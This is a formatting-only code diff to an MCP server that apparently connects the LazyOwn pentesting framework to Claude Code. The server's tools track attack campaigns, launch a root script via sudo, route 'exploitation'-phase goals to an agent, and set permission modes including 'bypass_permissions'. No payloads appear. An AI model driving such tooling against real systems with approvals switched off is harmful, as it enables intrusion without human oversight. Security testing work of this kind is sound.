                 return "\n".join(out_parts)
 
             if mode == "session":
                 rows = _pdb.query_session(
-                    phase=phase, target=target,
-                    success_only=success_only, limit=limit,
+                    phase=phase,
+                    target=target,
+                    success_only=success_only,
+                    limit=limit,
                 )
                 if not rows:
                     return f"No session rows for phase='{phase}' target='{target}'."
@@ -10548,10 +10840,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _PDB_AVAILABLE or _pdb is None:
             return text("ParquetDB unavailable. Run: pip install pandas pyarrow")
 
-        row_id   = arguments.get("row_id", "")
-        success  = arguments.get("success")   # may be None
+        row_id = arguments.get("row_id", "")
+        success = arguments.get("success")  # may be None
         category = arguments.get("category")
-        outcome  = arguments.get("outcome")
+        outcome = arguments.get("outcome")
 
         if not row_id:
             return text("row_id is required.")
@@ -10571,6 +10863,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         def _run_campaign() -> str:
             try:
                 from lazyown_campaign import CampaignStore
+
                 cs = CampaignStore()
             except ImportError:
                 return "lazyown_campaign.py not found in SKILLS_DIR."
@@ -10601,7 +10894,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return cs.summary()
 
             elif action == "phase":
-                host  = arguments.get("host", "")
+                host = arguments.get("host", "")
                 phase = arguments.get("phase", "")
                 if not host or not phase:
                     return "host and phase are required for action='phase'."
@@ -10640,13 +10933,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         def _run_daemon() -> str:
             import subprocess
             import sys
+
             daemon_script = str(SKILLS_DIR / "lazyown_daemon.py")
 
             if action == "start":
                 try:
                     proc = subprocess.Popen(
                         [sys.executable, daemon_script, "start"],
-                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
                     )
                     out, err = proc.communicate(timeout=10)
                     return (out + err).decode(errors="replace").strip() or "Daemon start requested."
@@ -10657,7 +10952,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 try:
                     proc = subprocess.run(
                         [sys.executable, daemon_script, "stop"],
-                        capture_output=True, timeout=10,
+                        capture_output=True,
+                        timeout=10,
                     )
                     return proc.stdout.decode(errors="replace").strip() or "Daemon stop requested."
                 except Exception as exc:
@@ -10667,7 +10963,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 try:
                     proc = subprocess.run(
                         [sys.executable, daemon_script, "status"],
-                        capture_output=True, timeout=10,
+                        capture_output=True,
+                        timeout=10,
                     )
                     return proc.stdout.decode(errors="replace").strip() or "No daemon status available."
                 except Exception as exc:
@@ -10681,11 +10978,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── fast_run ──────────────────────────────────────────────────────────────
     elif name == "lazyown_fast_run":
         confirm = bool(arguments.get("confirm", False))
-        vpn     = int(arguments.get("vpn", 1))
+        vpn = int(arguments.get("vpn", 1))
 
-        cfg     = _load_payload()
-        rhost   = cfg.get("rhost", "<not set>")
-        domain  = cfg.get("domain", "<not set>")
+        cfg = _load_payload()
+        rhost = cfg.get("rhost", "<not set>")
+        domain = cfg.get("domain", "<not set>")
 
         plan_lines = [
             "LazyOwn fast_run_as_r00t.sh — launch plan",
@@ -10724,7 +11021,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             import time
 
             askpass_script = str(LAZYOWN_DIR / "modules" / "gui_askpass.sh")
-            fast_run       = str(LAZYOWN_DIR / "fast_run_as_r00t.sh")
+            fast_run = str(LAZYOWN_DIR / "fast_run_as_r00t.sh")
 
             if not os.path.isfile(askpass_script):
                 return f"[fast_run] SUDO_ASKPASS helper not found: {askpass_script}"
@@ -10739,8 +11036,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
             try:
                 proc = subprocess.Popen(
-                    ["sudo", "-A", "./fast_run_as_r00t.sh",
-                     "--no-attach", "--vpn", str(vpn)],
+                    ["sudo", "-A", "./fast_run_as_r00t.sh", "--no-attach", "--vpn", str(vpn)],
                     cwd=str(LAZYOWN_DIR),
                     env=env,
                     stdin=subprocess.DEVNULL,
@@ -10781,9 +11077,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     "WARNING: tmux session 'lazyown_sessions' not detected after 15 s. "
                     "The script may still be initialising."
                 )
-                lines.append(
-                    "Check manually:  tmux ls  |  tmux attach -t lazyown_sessions"
-                )
+                lines.append("Check manually:  tmux ls  |  tmux attach -t lazyown_sessions")
             if err:
                 lines.append("")
                 lines.append("stderr (first 500 chars):")
@@ -10796,27 +11090,29 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── SWAN MoE+RL tools ─────────────────────────────────────────────────────
     elif name == "lazyown_swan_run":
         task_type = arguments.get("task_type", "analyze")
-        goal      = arguments.get("goal", "")
-        phase     = arguments.get("phase", "exploitation")
+        goal = arguments.get("goal", "")
+        phase = arguments.get("phase", "exploitation")
         if not goal.strip():
             return text("[swan_run] 'goal' parameter is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "skills"))
             from swan_agent import mcp_swan_run as _swan_run
+
             return text(_swan_run(task_type, goal, phase))
         except Exception as exc:
             return text(f"[swan_run error] {exc}")
 
     elif name == "lazyown_swan_ensemble":
         task_type = arguments.get("task_type", "analyze")
-        goal      = arguments.get("goal", "")
+        goal = arguments.get("goal", "")
         n_experts = int(arguments.get("n_experts", 3))
-        phase     = arguments.get("phase", "exploitation")
+        phase = arguments.get("phase", "exploitation")
         if not goal.strip():
             return text("[swan_ensemble] 'goal' parameter is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "skills"))
             from swan_agent import mcp_swan_ensemble as _swan_ensemble
+
             return text(_swan_ensemble(task_type, goal, n_experts, phase))
         except Exception as exc:
             return text(f"[swan_ensemble error] {exc}")
@@ -10825,16 +11121,18 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "skills"))
             from swan_agent import mcp_swan_status as _swan_status
+
             return text(_swan_status())
         except Exception as exc:
             return text(f"[swan_status error] {exc}")
 
     elif name == "lazyown_swan_route":
         task_type = arguments.get("task_type", "analyze")
-        goal      = arguments.get("goal", "")
+        goal = arguments.get("goal", "")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "skills"))
             from swan_agent import mcp_swan_route as _swan_route
+
             return text(_swan_route(task_type, goal))
         except Exception as exc:
             return text(f"[swan_route error] {exc}")
@@ -10874,9 +11172,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── dynamic tools (lazyown_addon_*, lazyown_tool_*, lazyown_plugin_*) ────
     if _automapper is not None and (
-        name.startswith("lazyown_addon_")
-        or name.startswith("lazyown_tool_")
-        or name.startswith("lazyown_plugin_")
+        name.startswith("lazyown_addon_") or name.startswith("lazyown_tool_") or name.startswith("lazyown_plugin_")
     ):
         cfg = _load_payload()
         dyn_result = await asyncio.get_event_loop().run_in_executor(
@@ -10897,10 +11193,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             all_tools = await list_tools()
         except Exception as e:
             return text(f"[search_tools error] {e}")
-        matches = [
-            t for t in all_tools
-            if query in t.name.lower() or query in (t.description or "").lower()
-        ]
+        matches = [t for t in all_tools if query in t.name.lower() or query in (t.description or "").lower()]
         if not matches:
             return text(f"No tools found matching '{query}'.")
         lines = [f"Found {len(matches)} tool(s) matching '{query}':"]
@@ -10933,7 +11226,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             try:
                 return text(perm_sys.set_mode(mode))
             except ValueError as e:
-                return text(f"Invalid mode: {e}\nValid: plan | default | accept_edits | auto | dont_ask | bypass_permissions")
+                return text(
+                    f"Invalid mode: {e}\nValid: plan | default | accept_edits | auto | dont_ask | bypass_permissions"
+                )
 
         if action == "add_rule":
             tp = arguments.get("tool_pattern", "")
@@ -10997,7 +11292,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             ]
             for ev, stats in m["per_event"].items():
                 if stats["runs"] > 0:
-                    lines.append(f"    {ev:20s} runs={stats['runs']:4d}  blocks={stats['blocks']:3d}  errors={stats['errors']:3d}")
+                    lines.append(
+                        f"    {ev:20s} runs={stats['runs']:4d}  blocks={stats['blocks']:3d}  errors={stats['errors']:3d}"
+                    )
             lines.append("")
         else:
             lines += ["▼ HOOKS", "  unavailable (lazyown_hooks not loaded)", ""]
@@ -11010,9 +11307,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             results = sum(1 for e in events if e.get("type") == "tool_result")
             boundaries = sum(1 for e in events if e.get("type") == "compact_boundary")
             denied = sum(
-                1 for e in events
-                if e.get("type") == "permission_decision"
-                and e.get("data", {}).get("decision") == "deny"
+                1
+                for e in events
+                if e.get("type") == "permission_decision" and e.get("data", {}).get("decision") == "deny"
             )
             lines += [
                 "▼ SESSION TRANSCRIPT",
@@ -11095,7 +11392,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 boundaries.append(f"  [{ts_str}] {summary}")
             elif t == "permission_decision":
                 if d.get("decision") == "deny":
-                    denials.append(f"  [{ts_str}] {d.get('tool_name','?')} → {d.get('reason','')[:60]}")
+                    denials.append(f"  [{ts_str}] {d.get('tool_name', '?')} → {d.get('reason', '')[:60]}")
 
         lines = [
             f"═══ Session Resume: {ts_obj.session_id} ═══",
@@ -11130,19 +11427,28 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         parent = _get_transcript()
         try:
             from lazyown_session import SessionTranscript
+
             sidechain = SessionTranscript(SESSIONS_DIR)  # fresh session_id
-            sidechain.append("subagent_init", {
-                "goal": goal, "backend": backend,
-                "parent_session": parent.session_id if parent else None,
-            })
+            sidechain.append(
+                "subagent_init",
+                {
+                    "goal": goal,
+                    "backend": backend,
+                    "parent_session": parent.session_id if parent else None,
+                },
+            )
         except Exception as exc:
             return text(f"Failed to create sidechain transcript: {exc}")
 
         # 2. Log spawn event in PARENT transcript
         if parent is not None:
-            parent.append("subagent_spawned", {
-                "goal": goal, "sidechain_session": sidechain.session_id,
-            })
+            parent.append(
+                "subagent_spawned",
+                {
+                    "goal": goal,
+                    "sidechain_session": sidechain.session_id,
+                },
+            )
 
         # 3. Wrap _runner so subagent's tool calls write to SIDECHAIN, not parent
         def _isolated_runner(cmd: str) -> str:
@@ -11223,7 +11529,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         if action == "add_rule":
             rule_name = arguments.get("rule_name", "").strip()
-            content   = arguments.get("content", "")
+            content = arguments.get("content", "")
             if not rule_name or not content:
                 return text("'rule_name' and 'content' required for add_rule.")
             return text(loader.add_rule(rule_name, content))
@@ -11244,13 +11550,16 @@ def _handle_sighup(signum, frame):
     """Clean exit on SIGHUP — Claude Code will restart the server automatically."""
     sys.exit(0)
 
+
 signal.signal(signal.SIGHUP, _handle_sighup)
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
 
+
 async def main():
     import sys as _sys
+
     # --sse [PORT]  → run as HTTP/SSE daemon (default port 9871)
     # default       → stdio (Claude Code subprocess model)
     if "--sse" in _sys.argv:
@@ -11267,18 +11576,18 @@ async def main():
         _sse_transport = SseServerTransport("/messages/")
 
         async def _handle_sse(request):
-            async with _sse_transport.connect_sse(
-                request.scope, request.receive, request._send
-            ) as streams:
+            async with _sse_transport.connect_sse(request.scope, request.receive, request._send) as streams:
                 await server.run(streams[0], streams[1], server.create_initialization_options())
 
         async def _handle_messages(scope, receive, send):
             await _sse_transport.handle_post_message(scope, receive, send)
 
-        _app = Starlette(routes=[
-            Route("/sse", endpoint=_handle_sse),
-            Mount("/messages/", app=_handle_messages),
-        ])
+        _app = Starlette(
+            routes=[
+                Route("/sse", endpoint=_handle_sse),
+                Mount("/messages/", app=_handle_messages),
+            ]
+        )
         print(f"[mcp] SSE server on http://127.0.0.1:{_port}/sse", flush=True)
         await uvicorn.Server(uvicorn.Config(_app, host="127.0.0.1", port=_port, log_level="warning")).serve()
     else:
